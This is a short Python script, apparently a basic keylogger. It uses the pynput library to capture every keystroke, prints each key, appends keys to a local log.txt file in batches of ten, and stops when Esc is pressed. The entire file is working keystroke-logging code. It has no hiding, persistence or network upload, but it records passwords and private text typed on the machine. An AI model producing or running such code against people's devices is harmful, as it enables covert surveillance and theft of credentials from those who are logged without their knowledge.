import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(e):
    global keys, count
    keys.append(e)
    count += 1
    print('{0} pressed '.format(e))
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(str(key))

def on_release(e):
    if e == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()